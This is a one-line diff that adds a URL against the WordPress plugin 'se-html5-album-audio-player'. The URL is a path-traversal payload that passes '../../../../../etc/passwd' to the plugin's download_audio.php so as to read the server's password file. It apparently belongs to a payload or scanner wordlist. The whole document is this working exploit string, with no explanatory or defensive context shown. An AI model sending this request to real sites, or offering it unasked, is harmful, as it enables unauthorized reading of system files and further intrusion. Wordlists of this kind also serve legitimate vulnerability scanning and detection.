@@ -1,0 +1,1 @@
+/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd
